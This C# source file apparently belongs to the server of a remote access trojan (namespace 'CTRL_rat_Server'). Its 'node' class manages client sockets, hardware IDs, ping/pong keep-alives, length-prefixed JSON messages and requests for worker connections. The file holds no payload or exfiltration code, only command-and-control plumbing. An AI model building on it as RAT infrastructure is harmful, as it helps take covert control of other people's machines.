using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;
using System.Threading;
using System.Web.Script.Serialization;

namespace CTRL_rat_Server
{
    public class node
    {
        public Socket sock;
        private bool _isalive;
        public bool isalive { 
            set { 
                if (!value)
                {
                    dispose();
                } 
                else 
                { 
                    _isalive = true; 
                } 
            } get 
            { 
                return _isalive; 
            } 
        }
        public Action<node, byte[]> OnCompletedRequest;
        public Action<node, int, int> OnPartialRequest;
        public Action<node> OnClose;
        public bool In_transit = false;
        public static bool currently_in_progress = false;
        public Timer ping;
        public bool recived_pong = false;
        public JavaScriptSerializer serializer = new JavaScriptSerializer();
        public Dictionary<string, node> workers = new Dictionary<string, node>();
        public List<string> pending_workers = new List<string>();
        public Listener parent;
        public string hwid;
        public void Init() 
        {
            serializer.MaxJsonLength= 0x7FFFFFFF;
            (new Thread(Main)).Start();
        }
        public void dispose() 
        {
            try
            {
                sock.Shutdown(SocketShutdown.Both);
            }
            catch { }
            try
            {
                sock.Close();
            }
            catch { }
            try
            {
                _isalive = false;
                ping.Dispose();
            }
            catch { }
            OnClose(this);
        }
        public Dictionary<object, object> ObjectToDictionary(object obb)
        {
            serializer.MaxJsonLength = 0x7FFFFFFF;
            return JsonToDictionary(DictionaryToJson(obb));
        }
        public Dictionary<object, object>[] ObjectToArray(object obb)
        {
            serializer.MaxJsonLength = 0x7FFFFFFF;
            return serializer.Deserialize<Dictionary<object, object>[]>(DictionaryToJson(obb));
        }
        public Dictionary<object, object> JsonToDictionary(string json)
        {
            serializer.MaxJsonLength = 0x7FFFFFFF;
            return serializer.Deserialize<Dictionary<object, object>>(json);
        }
        public string DictionaryToJson(object dict)
        {
            serializer.MaxJsonLength = 0x7FFFFFFF;
            return serializer.Serialize(dict);
        }
        public void Main() 
        {
            ping = new Timer(new TimerCallback(ping_callback), null, 0, 5000);
            StateObject state = new StateObject();
            sock.BeginReceive(state.buffer, 0, StateObject.BufferSize, 0, new AsyncCallback(ReadCallback), state);
            while (isalive)
            {
                Thread.Sleep(2000);
                if (!isalive)
                {
                    break;
                }
            }
        }
        public void ping_callback(object state) 
        {
            if (currently_in_progress) return;
            if (In_transit) return;
            currently_in_progress = true;
            var response = new Dictionary<object, object>();
            response["op"] = "ping";
            Send(sock, Encoding.UTF8.GetBytes(DictionaryToJson(response)));
            Thread.Sleep(3000);
            if (!recived_pong && !In_transit) { isalive = false; }
            currently_in_progress = false;
            recived_pong = false;
        }
        public byte[] Concat(byte[] a, byte[] b)
        {
            if (a == null) a = new byte[] { };
            byte[] output = new byte[a.Length + b.Length];
            for (int i = 0; i < a.Length; i++)
                output[i] = a[i];
            for (int j = 0; j < b.Length; j++)
                output[a.Length + j] = b[j];
            return output;
        }
        private byte[] RECVAll(Socket socket, int size)
        {
            In_transit = true;
            byte[] data = new byte[size];
            int total = 0;
            int dataleft = size;
            while (total < size)
            {
                int recv = socket.Receive(data, total, dataleft, SocketFlags.None);
                if (recv == 0)
                {
                    data = null;
                    isalive = false;
                    break;
                }
                total += recv;
                //onpartialrequest can go here, retrieving the total and the data left as incomplete bytes are kinda useless
                Console.WriteLine(recv);
                dataleft -= recv;
            }
            In_transit = false;
            return data;
        }
        public void ReadCallback(IAsyncResult ar)
        {
            try
            {
                if (isalive)
                {
                    StateObject state = (StateObject)ar.AsyncState;
                    int bytesRead = sock.EndReceive(ar);
                    Console.WriteLine(bytesRead.ToString()+" no way!");
                    if (bytesRead > 0)
                    {

                        state.recived = Concat(state.recived, state.buffer);
                        int length = state.recived[0] | state.recived[1] << 8 | state.recived[2] << 16 | state.recived[3] << 24;
                        byte[] data = RECVAll(sock, length);
                        if (data == null) return;
                        state = new StateObject();
                        //Console.WriteLine(Encoding.UTF8.GetString(data));
                        var recvieddata = JsonToDictionary(Encoding.UTF8.GetString(data));
                        var response = new Dictionary<object, object>();
                        if ((string)recvieddata["op"] == "pong")
                        {
                            recived_pong = true;
                        }
                        else if ((string)recvieddata["op"] == "ping")
                        {
                            response["op"] = "pong";
                            Send(sock, Encoding.UTF8.GetBytes(DictionaryToJson(response)));
                            Console.WriteLine("sent");
                        }
                        else
                        {

                            new Thread(()=> OnCompletedRequest(this, data)).Start();
                        }
                    }
                    else
                    {
                        //Console.WriteLine("does this happen??");
                        //if it suddenly has problem reciving uncomment the line below
                        //sock.BeginReceive(state.buffer, 0, StateObject.BufferSize, 0, new AsyncCallback(ReadCallback), state);
                        isalive = false;
                    }
                    sock.BeginReceive(state.buffer, 0, StateObject.BufferSize, 0, new AsyncCallback(ReadCallback), state);
                }
            }
            catch
            {
                isalive = false;
            }
        }
        public void Send(Socket handler, byte[] data)
        {
            byte[] size = new byte[] { (byte)data.Length, (byte)(data.Length >> 8), (byte)(data.Length >> 16), (byte)(data.Length >> 24) };
            data = Concat(size, data);
            try
            {
                handler.BeginSend(data, 0, data.Length, 0, new AsyncCallback(SendCallback), handler);
            }
            catch { isalive = false; }
        }

        private void SendCallback(IAsyncResult ar)
        {
            try
            {
                // Retrieve the socket from the state object.  
                Socket handler = (Socket)ar.AsyncState;

                // Complete sending the data to the remote device.  
                int bytesSent = handler.EndSend(ar);
                Console.WriteLine("Sent {0} bytes to client.", bytesSent);
                //handler.Shutdown(SocketShutdown.Both);
                //handler.Close();

            }
            catch
            {
                isalive = false;
            }
        }
        public node get_or_create_worker_node(string id)
        {
            if (workers.ContainsKey(id)) return workers[id];
            pending_workers.Add(id);
            var response = new Dictionary<object, object>();
            response["op"] = "reqworker";
            response["id"] = id;
            Send(sock, Encoding.UTF8.GetBytes(DictionaryToJson(response)));
            while (!workers.ContainsKey(id)) 
            {
                Thread.Sleep(2000);
            }
            pending_workers.Remove(id);
            if (workers.ContainsKey(id)) return workers[id];
            return null;
        }
        public string generate_random_id() 
        {
            return Guid.NewGuid().ToString("N");
        }
    }
}
